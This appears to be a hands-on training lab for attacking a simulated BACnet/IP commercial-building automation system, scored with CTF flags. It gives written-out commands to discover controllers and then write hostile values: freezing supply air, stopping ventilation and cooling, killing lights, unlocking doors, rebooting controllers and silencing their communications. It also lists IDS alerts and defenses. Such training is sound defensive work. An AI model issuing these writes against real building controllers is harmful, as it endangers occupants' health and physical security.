# Lab 6: BACnet Building Automation Attack

## Overview
| Property | Value |
|----------|-------|
| Duration | 75 minutes |
| Difficulty | Intermediate |
| Protocol | BACnet/IP |
| Scenario | Commercial Building BAS |
| Attacker IP | 10.0.5.100 |

## Learning Objectives
By completing this lab, you will:
1. Understand BACnet/IP protocol structure
2. Discover BACnet devices using Who-Is/I-Am
3. Read building automation data
4. Manipulate HVAC setpoints and outputs
5. Execute device control attacks
6. Understand building automation security risks

## Background

### BACnet Protocol
BACnet (Building Automation and Control Networks) is the standard protocol for building automation systems (BAS).

**Common Applications:**
- HVAC control
- Lighting systems
- Access control
- Fire/life safety
- Energy management

**Protocol Variants:**
- BACnet/IP (UDP port 47808) - our target
- BACnet MS/TP (RS-485)
- BACnet Ethernet
- BACnet ARCnet

### BACnet Object Model
Everything in BACnet is an object with properties:

| Object Type | Code | Description |
|-------------|------|-------------|
| Analog Input | 0 | Sensor reading (temp, humidity) |
| Analog Output | 1 | Control signal (valve position) |
| Analog Value | 2 | Setpoint or calculation |
| Binary Input | 3 | On/off status (fan running) |
| Binary Output | 4 | On/off control (start fan) |
| Binary Value | 5 | On/off setpoint |
| Device | 8 | Controller itself |
| Schedule | 17 | Time-based automation |

### Target: Commercial Building
10-story office building with:
- 4 Air Handling Units (AHUs)
- 40 VAV boxes (4 per floor)
- Chiller plant
- Lighting zones
- Access control points

## Part 1: BACnet Fundamentals (15 min)

### Message Structure
```
┌─────────────────────────────────────┐
│     BVLC Header (4 bytes)           │
│  Type | Function | Length           │
├─────────────────────────────────────┤
│     NPDU (Network Layer)            │
│  Version | Control | Addressing     │
├─────────────────────────────────────┤
│     APDU (Application Layer)        │
│  PDU Type | Service | Data          │
└─────────────────────────────────────┘
```

### Key Services
| Service | Description |
|---------|-------------|
| Who-Is / I-Am | Device discovery |
| ReadProperty | Read object property |
| WriteProperty | Modify object property |
| SubscribeCOV | Change of value subscription |
| ReinitializeDevice | Restart device |
| DeviceCommunicationControl | Enable/disable comms |

### Security Concerns
BACnet was designed for reliability, not security:
- No built-in authentication
- No encryption
- Broadcast discovery
- Any device can write to any object

## Part 2: BACnet Reconnaissance (15 min)

### Task 2.1: Access Attacker Workstation
```bash
docker exec -it vulnot-attacker-bacnet bash
```

### Task 2.2: Device Discovery
Send Who-Is broadcast:
```bash
vulnot-bacnet scan -t 10.0.5.255
```

Expected output:
```
╔════════════════════════════════════════╗
║      VULNOT BACnet Device Scanner      ║
╚════════════════════════════════════════╝

Discovered BACnet Devices
┌────────────┬───────┬──────────────────┐
│ IP Address │ Port  │ Response         │
├────────────┼───────┼──────────────────┤
│ 10.0.5.10  │ 47808 │ 810a001c0120... │
└────────────┴───────┴──────────────────┘

Found 1 BACnet device(s)
```

**🚩 FLAG: bacnet_scan_complete**

### Task 2.3: Read Device Properties
```bash
vulnot-bacnet read -t 10.0.5.10
```

Document what you find:
- Object types present
- Number of each type
- Device vendor/model

## Part 3: Understanding the Target (10 min)

### Building Control Strategy
```
Outside Air ──┐
              ├──► AHU ──► VAV Boxes ──► Zones
Return Air ───┘
                    │
              ┌─────┴─────┐
              │  Chiller  │
              └───────────┘
```

### Key Control Points

| Object | Description | Impact if Compromised |
|--------|-------------|----------------------|
| AHU Supply Temp SP | Cooling setpoint | Comfort, energy |
| AHU Fan Command | Start/stop fan | Loss of ventilation |
| VAV Damper | Airflow control | Zone temperature |
| Chiller Enable | Cooling plant | Building-wide cooling |
| Lighting Level | Zone brightness | Occupant comfort |
| Access Point | Door lock | Physical security |

## Part 4: HVAC Manipulation Attacks (20 min)

### ⚠️ WARNING
In real buildings, these attacks could cause:
- Occupant discomfort
- Equipment damage
- Energy waste
- Safety hazards

### Attack 4.1: Freeze Occupants
Set supply air temperature dangerously low:
```bash
vulnot-bacnet write -t 10.0.5.10 -o 2 -i 1 --property 85 -v 40
```

**Expected Impact:**
- AHU supplies 40°F air
- Zones become frigid
- Complaints and evacuation
- Potential pipe freezing

### Attack 4.2: Disable Ventilation
Stop AHU fan:
```bash
vulnot-bacnet write -t 10.0.5.10 -o 4 -i 1 --property 85 -v 0
```

**Expected Impact:**
- No fresh air
- CO2 buildup
- Stuffiness
- Health hazard over time

### Attack 4.3: Disable Cooling
Turn off chiller:
```bash
vulnot-bacnet write -t 10.0.5.10 -o 4 -i 100 --property 85 -v 0
```

**Expected Impact:**
- Building heats up
- Server rooms at risk
- Productivity loss
- Equipment damage

**🚩 FLAG: bacnet_hvac_attack**

## Part 5: Building-Wide Attacks (10 min)

### Attack 5.1: Lights Out
Set all lighting to 0%:
```bash
# Lobby
vulnot-bacnet write -t 10.0.5.10 -o 1 -i 200 --property 85 -v 0
# Floor 1
vulnot-bacnet write -t 10.0.5.10 -o 1 -i 201 --property 85 -v 0
```

### Attack 5.2: Unlock All Doors
If access control is on BACnet:
```bash
vulnot-bacnet write -t 10.0.5.10 -o 5 -i 300 --property 85 -v 0
```

**🚩 FLAG: bacnet_access_attack**

## Part 6: Device-Level Attacks (5 min)

### Attack 6.1: Reinitialize Device
Force controller restart:
```bash
vulnot-bacnet reinit -t 10.0.5.10 -s coldstart
```

**Impact:**
- Controller reboots
- Temporary loss of control
- Outputs go to default state
- Alarms generated

### Attack 6.2: Disable Communications
Silence the controller:
```bash
vulnot-bacnet disable -t 10.0.5.10 -d 60
```

**Impact:**
- Device stops responding for 60 minutes
- Cannot be monitored or controlled
- Alarms cleared (no communication)
- Stealth attack

**🚩 FLAG: bacnet_device_attack**

## Real-World Context

### Notable Building Attacks

**Target Store HVAC (2013)**
- Attackers compromised HVAC vendor
- Used access to pivot to payment systems
- 40 million credit cards stolen
- Building systems as attack vector

**German Steel Mill (2014)**
- Attackers manipulated furnace controls
- Prevented proper shutdown
- Physical damage to blast furnace
- Industrial control via IT network

### Building Automation Risks
- Often managed by facilities, not IT
- Legacy systems with long lifecycles
- Integration with IT networks increasing
- Remote access for vendors common

## Detection & Defense

### What Would IDS See?
```
[BACNET-001] Unauthorized WriteProperty - 10.0.5.100 -> 10.0.5.10
[BACNET-002] DeviceCommunicationControl detected
[BACNET-003] ReinitializeDevice command sent
[GENERIC-001] Value Anomaly: Supply Temp SP = 40°F
```

### Defensive Measures
1. **Network Segmentation**: Isolate BAS network
2. **BACnet Secure Connect (BACnet/SC)**: Use TLS
3. **Firewall Rules**: Limit who can write
4. **Monitoring**: Log all WriteProperty commands
5. **Physical Security**: Protect controller access
6. **Vendor Management**: Secure remote access

## Assessment Questions

1. What UDP port does BACnet/IP use?
2. How does Who-Is/I-Am discovery work?
3. What's the difference between Analog Output and Analog Value?
4. Why is DeviceCommunicationControl particularly dangerous?
5. How might an attacker use BACnet access for a larger attack?

## Flags Summary
| Flag | Points | Description |
|------|--------|-------------|
| bacnet_scan_complete | 10 | Discovered BACnet device |
| bacnet_hvac_attack | 20 | Manipulated HVAC |
| bacnet_access_attack | 25 | Modified access control |
| bacnet_device_attack | 25 | Executed device attack |

## Next Steps
- Explore EtherNet/IP attacks in Lab 7
- Try chaining attacks across protocols
- Study BACnet Secure Connect specification
